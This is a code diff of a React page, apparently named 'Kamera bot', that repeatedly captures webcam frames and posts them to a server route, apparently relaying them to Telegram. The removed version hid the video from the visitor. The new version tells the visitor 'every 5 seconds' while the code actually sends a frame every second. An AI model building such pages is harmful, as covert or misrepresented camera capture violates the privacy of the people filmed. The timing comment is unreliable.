@@ -1,71 +1,56 @@
-import { useEffect, useRef, useState } from "react";
+import { useRef, useEffect, useState } from "react";
 
 export default function Home() {
   const videoRef = useRef(null);
-  const canvasRef = useRef(null);
-  const [status, setStatus] = useState("Kamera ishga tushmoqda...");
+  const [sending, setSending] = useState(false);
 
   useEffect(() => {
-  async function startCamera() {
-    try {
-      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-      const video = document.querySelector("video");
-      video.srcObject = stream;
-    } catch (err) {
-      console.error("Kamera ishga tushmadi:", err);
-      alert("Kamera ruxsati berilmagan yoki xato yuz berdi.");
-    }
-  }
+    // Kamerani ishga tushirish
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => { videoRef.current.srcObject = stream; })
+      .catch(err => console.error("Camera error:", err));
 
-    async function captureFrame() {
-      const video = videoRef.current;
-      const canvas = canvasRef.current;
-      if (!video || !video.videoWidth) return;
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      const ctx = canvas.getContext("2d");
-      ctx.drawImage(video, 0, 0);
-      const blob = await new Promise((resolve) =>
-        canvas.toBlob(resolve, "image/jpeg", 0.8)
-      );
-      await sendToServer(blob);
-    }
+    // Har 5 soniyada rasm yuborish
+    const interval = setInterval(() => {
+      captureAndSend();
+    }, 1000); // 5000 ms = 5 soniya
 
-    async function sendToServer(blob) {
-      const form = new FormData();
-      form.append("photo", blob, "photo.jpg");
-      const res = await fetch("/api/send-photo", {
-        method: "POST",
-        body: form,
-      });
-      const json = await res.json();
-      if (json.ok) {
-        setStatus("✅ Yuborildi: " + new Date().toLocaleTimeString());
-      } else {
-        setStatus("❌ Xato: " + (json.error || "Telegram xatosi"));
-      }
-    }
-
-    startCamera();
+    return () => clearInterval(interval);
   }, []);
 
+  const captureAndSend = async () => {
+    if (sending || !videoRef.current) return;
+    setSending(true);
+
+    try {
+      const canvas = document.createElement("canvas");
+      canvas.width = videoRef.current.videoWidth;
+      canvas.height = videoRef.current.videoHeight;
+      canvas.getContext("2d").drawImage(videoRef.current, 0, 0);
+
+      const blob = await new Promise(r => canvas.toBlob(r, "image/jpeg"));
+      const formData = new FormData();
+      formData.append("photo", blob, "auto_frame.jpg");
+
+      const res = await fetch("/api/send-photo", {
+        method: "POST",
+        body: formData,
+      });
+
+      const data = await res.json();
+      console.log("Auto send response:", data);
+    } catch (err) {
+      console.error("Error sending auto photo:", err);
+    }
+
+    setSending(false);
+  };
+
   return (
-    <div
-      style={{
-        height: "100vh",
-        display: "flex",
-        flexDirection: "column",
-        alignItems: "center",
-        justifyContent: "center",
-        background: "#000",
-        color: "#fff",
-        fontFamily: "Arial, sans-serif",
-      }}
-    >
-      <h1>Kamera bot</h1>
-      <p>{status}</p>
-      <video ref={videoRef} autoPlay playsInline style={{ display: "none" }} />
-      <canvas ref={canvasRef} style={{ display: "none" }} />
+    <div style={{ textAlign: "center" }}>
+      <h1>Avtomatik Kamera Bot</h1>
+      <video ref={videoRef} autoPlay playsInline style={{ width: "100%", maxWidth: "400px" }} />
+      <p>{sending ? "Yuborilmoqda..." : "Har 5 soniyada rasm yuboriladi"}</p>
     </div>
   );
 }
